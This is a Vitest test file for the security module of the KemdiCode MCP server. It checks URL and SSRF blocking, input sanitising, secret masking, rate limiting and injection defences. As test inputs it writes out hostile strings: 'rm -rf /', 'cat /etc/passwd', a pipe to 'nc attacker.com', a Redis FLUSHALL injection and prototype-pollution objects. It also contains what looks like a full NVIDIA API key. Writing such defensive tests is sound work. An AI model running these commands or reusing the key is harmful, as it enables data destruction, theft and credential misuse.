/**
 * KemdiCode MCP Server - Security Module Tests
 * Copyright (C) 2024-2026 Kemdi Sp. z o.o.
 */

import { describe, it, expect, beforeEach } from 'vitest';
import {
  SecureStorage,
  validateUrl,
  sanitizeRedisKey,
  sanitizePathComponent,
  signData,
  verifySignature,
  maskSensitiveData,
  sanitizeErrorMessage,
  generateSecureId,
  RateLimiter,
  safeJsonParse,
  safeObjectMerge,
  validateCommandArgs,
  getSecureTempPath,
} from '../../src/utils/security.js';

describe('Security Module', () => {
  describe('SecureStorage', () => {
    let storage: SecureStorage;

    beforeEach(() => {
      storage = new SecureStorage('test-password', 'test-salt');
    });

    it('should encrypt and decrypt values', () => {
      storage.set('apiKey', 'sk-1234567890');
      const retrieved = storage.get('apiKey');
      expect(retrieved).toBe('sk-1234567890');
    });

    it('should return null for non-existent keys', () => {
      const retrieved = storage.get('non-existent');
      expect(retrieved).toBeNull();
    });

    it('should delete values', () => {
      storage.set('key', 'value');
      storage.delete('key');
      expect(storage.get('key')).toBeNull();
    });

    it('should check if key exists', () => {
      storage.set('key', 'value');
      expect(storage.has('key')).toBe(true);
      expect(storage.has('non-existent')).toBe(false);
    });

    it('should clear all values', () => {
      storage.set('key1', 'value1');
      storage.set('key2', 'value2');
      storage.clear();
      expect(storage.get('key1')).toBeNull();
      expect(storage.get('key2')).toBeNull();
    });
  });

  describe('validateUrl', () => {
    it('should accept valid HTTPS URLs', () => {
      const result = validateUrl('https://api.openai.com/v1');
      expect(result.valid).toBe(true);
    });

    it('should accept valid HTTP URLs', () => {
      const result = validateUrl('http://localhost:3000');
      expect(result.valid).toBe(false); // localhost is blocked
    });

    it('should block localhost', () => {
      const result = validateUrl('http://localhost/api');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('localhost');
    });

    it('should block 127.0.0.1', () => {
      const result = validateUrl('http://127.0.0.1:8080');
      expect(result.valid).toBe(false);
    });

    it('should block AWS metadata endpoint', () => {
      const result = validateUrl('http://169.254.169.254/latest/meta-data/');
      expect(result.valid).toBe(false);
    });

    it('should block private IP ranges', () => {
      expect(validateUrl('http://10.0.0.1/api').valid).toBe(false);
      expect(validateUrl('http://192.168.1.1/api').valid).toBe(false);
      expect(validateUrl('http://172.16.0.1/api').valid).toBe(false);
    });

    it('should reject invalid protocols', () => {
      const result = validateUrl('ftp://example.com');
      expect(result.valid).toBe(false);
    });

    it('should reject malformed URLs', () => {
      const result = validateUrl('not-a-url');
      expect(result.valid).toBe(false);
    });
  });

  describe('sanitizeRedisKey', () => {
    it('should allow valid characters', () => {
      expect(sanitizeRedisKey('valid:key_123.test')).toBe('valid:key_123.test');
    });

    it('should sanitize dangerous characters', () => {
      expect(sanitizeRedisKey('key\r\nDEL')).toBe('key__DEL');
      expect(sanitizeRedisKey('key:*')).toBe('key:_');
    });

    it('should prevent injection attacks', () => {
      const malicious = 'key\r\nFLUSHALL\r\n';
      const sanitized = sanitizeRedisKey(malicious);
      expect(sanitized).not.toContain('\r');
      expect(sanitized).not.toContain('\n');
    });
  });

  describe('sanitizePathComponent', () => {
    it('should accept valid filenames', () => {
      const result = sanitizePathComponent('valid_file.txt');
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('valid_file.txt');
    });

    it('should reject path traversal', () => {
      expect(sanitizePathComponent('../etc/passwd').valid).toBe(false);
      expect(sanitizePathComponent('..\\windows\\system32').valid).toBe(false);
    });

    it('should reject null bytes', () => {
      expect(sanitizePathComponent('file\0.txt').valid).toBe(false);
    });

    it('should reject long names', () => {
      expect(sanitizePathComponent('a'.repeat(300)).valid).toBe(false);
    });

    it('should reject invalid characters', () => {
      expect(sanitizePathComponent('file<>|.txt').valid).toBe(false);
    });
  });

  describe('signData and verifySignature', () => {
    it('should sign and verify data', () => {
      const data = 'important-data';
      const secret = 'my-secret-key';
      
      const signature = signData(data, secret);
      expect(verifySignature(data, signature, secret)).toBe(true);
    });

    it('should reject tampered data', () => {
      const data = 'important-data';
      const secret = 'my-secret-key';
      
      const signature = signData(data, secret);
      expect(verifySignature('tampered-data', signature, secret)).toBe(false);
    });

    it('should reject invalid signature', () => {
      const data = 'important-data';
      const secret = 'my-secret-key';
      
      expect(verifySignature(data, 'invalid-signature', secret)).toBe(false);
    });
  });

  describe('maskSensitiveData', () => {
    it('should mask API keys', () => {
      const text = 'api_key=sk-1234567890abcdef';
      expect(maskSensitiveData(text)).toContain('***');
      expect(maskSensitiveData(text)).not.toContain('sk-1234567890abcdef');
    });

    it('should mask NVIDIA API keys', () => {
      const text = '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';
      const masked = maskSensitiveData(text);
      expect(masked).toContain('nvapi-***');
      expect(masked).not.toContain('PTYoq6tO6SI');
    });

    it('should mask passwords', () => {
      const text = 'password=supersecret123';
      expect(maskSensitiveData(text)).toContain('***');
    });

    it('should mask tokens', () => {
      const text = 'token=ghp_1234567890';
      expect(maskSensitiveData(text)).toContain('***');
    });
  });

  describe('sanitizeErrorMessage', () => {
    it('should mask home paths', () => {
      const error = new Error('File not found: /home/username/project/file.ts');
      const sanitized = sanitizeErrorMessage(error);
      expect(sanitized).toContain('/home/<user>');
      expect(sanitized).not.toContain('/home/username');
    });

    it('should mask current working directory', () => {
      const error = new Error(`Failed to read ${process.cwd()}/config.json`);
      const sanitized = sanitizeErrorMessage(error);
      expect(sanitized).toContain('<cwd>');
    });
  });

  describe('generateSecureId', () => {
    it('should generate unique IDs', () => {
      const id1 = generateSecureId();
      const id2 = generateSecureId();
      expect(id1).not.toBe(id2);
    });

    it('should include prefix when provided', () => {
      const id = generateSecureId('test');
      expect(id.startsWith('test_')).toBe(true);
    });

    it('should generate IDs with sufficient entropy', () => {
      const id = generateSecureId();
      expect(id.length).toBeGreaterThan(20);
    });
  });

  describe('RateLimiter', () => {
    it('should allow requests within limit', () => {
      const limiter = new RateLimiter(5, 60000); // 5 requests per minute
      
      expect(limiter.isAllowed('user1')).toBe(true);
      expect(limiter.isAllowed('user1')).toBe(true);
      expect(limiter.isAllowed('user1')).toBe(true);
      expect(limiter.isAllowed('user1')).toBe(true);
      expect(limiter.isAllowed('user1')).toBe(true);
      expect(limiter.isAllowed('user1')).toBe(false); // 6th request
    });

    it('should track different keys separately', () => {
      const limiter = new RateLimiter(2, 60000);
      
      expect(limiter.isAllowed('user1')).toBe(true);
      expect(limiter.isAllowed('user1')).toBe(true);
      expect(limiter.isAllowed('user1')).toBe(false);
      
      expect(limiter.isAllowed('user2')).toBe(true); // Different user
    });

    it('should report remaining requests', () => {
      const limiter = new RateLimiter(5, 60000);
      
      limiter.isAllowed('user1');
      limiter.isAllowed('user1');
      
      expect(limiter.getRemaining('user1')).toBe(3);
    });

    it('should reset limit', () => {
      const limiter = new RateLimiter(2, 60000);
      
      limiter.isAllowed('user1');
      limiter.isAllowed('user1');
      expect(limiter.isAllowed('user1')).toBe(false);
      
      limiter.reset('user1');
      expect(limiter.isAllowed('user1')).toBe(true);
    });
  });

  describe('safeJsonParse', () => {
    it('should parse valid JSON', () => {
      const result = safeJsonParse('{"key": "value"}');
      expect(result).toEqual({ key: 'value' });
    });

    it('should return null for invalid JSON', () => {
      expect(safeJsonParse('not json')).toBeNull();
    });

    it('should return null for oversized input', () => {
      const large = '{"data": "' + 'x'.repeat(100) + '"}';
      expect(safeJsonParse(large, 50)).toBeNull();
    });

    it('should parse arrays', () => {
      const result = safeJsonParse('[1, 2, 3]');
      expect(result).toEqual([1, 2, 3]);
    });
  });

  describe('safeObjectMerge', () => {
    it('should merge objects safely', () => {
      const target = { a: 1 };
      const source = { b: 2 };
      const result = safeObjectMerge(target, source);
      expect(result).toEqual({ a: 1, b: 2 });
    });

    it('should prevent prototype pollution', () => {
      const target = { a: 1 };
      const malicious = {
        __proto__: { polluted: true },
        constructor: { prototype: { admin: true } },
        b: 2,
      };
      const result = safeObjectMerge(target, malicious as Record<string, unknown>);
      
      expect(result).toEqual({ a: 1, b: 2 });
      expect((result as any).__proto__.polluted).toBeUndefined();
    });
  });

  describe('validateCommandArgs', () => {
    it('should allow safe arguments', () => {
      expect(validateCommandArgs(['file.txt', '--option'])).toEqual({ valid: true });
    });

    it('should reject command injection', () => {
      expect(validateCommandArgs(['file.txt; rm -rf /']).valid).toBe(false);
      expect(validateCommandArgs(['file.txt && cat /etc/passwd']).valid).toBe(false);
      expect(validateCommandArgs(['file.txt | nc attacker.com']).valid).toBe(false);
    });

    it('should reject command substitution', () => {
      expect(validateCommandArgs(['$(whoami)']).valid).toBe(false);
      expect(validateCommandArgs(['`id`']).valid).toBe(false);
    });

    it('should reject backticks', () => {
      expect(validateCommandArgs(['file`date`.txt']).valid).toBe(false);
    });
  });

  describe('getSecureTempPath', () => {
    it('should generate unique temp paths', () => {
      const path1 = getSecureTempPath();
      const path2 = getSecureTempPath();
      expect(path1).not.toBe(path2);
    });

    it('should use system temp directory', () => {
      const path = getSecureTempPath();
      const tmpDir = process.env.TMPDIR || process.env.TEMP || '/tmp';
      expect(path.startsWith(tmpDir)).toBe(true);
    });

    it('should include prefix when provided', () => {
      const path = getSecureTempPath('myapp-');
      expect(path).toContain('myapp-');
    });
  });
});
